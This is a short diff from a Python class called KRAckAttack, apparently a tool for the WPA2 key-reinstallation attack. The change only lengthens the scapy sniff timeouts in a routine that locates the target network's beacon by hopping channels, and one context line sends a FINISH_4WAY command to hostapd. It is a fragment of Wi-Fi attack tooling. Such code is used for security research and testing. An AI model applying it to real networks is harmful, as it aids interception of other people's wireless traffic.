@@ -501,7 +501,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=0, timeout=3, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
+		ps = sniff(count=0, timeout=5, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
 		print('505: ', end='')
 		print(ps)
 		if ps is None or len(ps) < 1:
@@ -509,7 +509,7 @@ class KRAckAttack():
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				ps = sniff(count=0, timeout=3, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
+				ps = sniff(count=0, timeout=5, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
 				if ps and len(ps) >= 1: break
 
 		if ps and len(ps) >= 1:
